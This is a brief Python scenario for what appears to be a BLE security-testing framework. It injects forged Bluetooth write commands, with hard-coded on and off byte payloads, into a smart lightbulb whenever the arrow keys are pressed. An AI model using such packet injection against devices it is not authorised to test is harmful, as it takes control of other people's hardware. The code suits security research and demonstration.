from mirage.core import scenario
from mirage.libs import io,ble,utils

class lightbulb_injection(scenario.Scenario):

	# When the module starts...
	def onStart(self):
		self.emitter = self.module.getEmitter(self.module["INTERFACE"])

	# When a key is pressed...
	def onKey(self,key):
		# if the key is 'up arrow' ...
		if key == "up":
			# inject a ON packet
			self.emitter.send(ble.BLEWriteCommand(handle=0x0021,value=b"\x55\x10\x01\x0d\x0a"))
		# if the key is 'down arrow' ...
		elif key == "down":
			# inject a OFF packet
			self.emitter.send(ble.BLEWriteCommand(handle=0x0021,value=b"\x55\x10\x00\x0d\x0a"))
